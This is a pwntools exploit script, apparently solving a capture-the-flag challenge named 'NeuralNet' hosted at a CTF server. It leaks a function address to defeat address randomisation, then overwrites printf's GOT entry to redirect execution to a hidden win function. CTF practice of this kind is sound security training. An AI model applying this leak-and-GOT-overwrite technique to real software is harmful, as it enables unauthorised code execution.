from pwn import *

filePath = './NeuralNet'
elf = ELF(filePath)
context.binary = elf

def start_process():
    if args.GDB:
        return gdb.debug(filePath, gdbscript='''
            b *main+302
            continue
        ''')
    elif args.REMOTE:
        return remote("ctf.mf.grsu.by", 9076)
    else:
        return process(filePath)

p = start_process()

p.recvuntil(b'predict_outcome): ')
leaked_addr_str = p.recvline().strip() 
leaked_predict_addr = int(leaked_addr_str, 16)

log.info(f"Leaked predict_outcome address: {hex(leaked_predict_addr)}")

base_addr = leaked_predict_addr - elf.symbols['predict_outcome']
log.info(f"Calculated program base address: {hex(base_addr)}")

elf.address = base_addr 

target_addr = elf.got['printf']
value_to_write = elf.symbols['unlock_secret_research_data']

log.info(f"Target address (printf@got): {hex(target_addr)}")
log.info(f"Value to write (win_func addr): {hex(value_to_write)}")

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'(hex): > ', hex(target_addr).encode())
p.sendlineafter(b'(hex): > ', hex(value_to_write).encode())


p.sendline(b'2')

p.interactive()

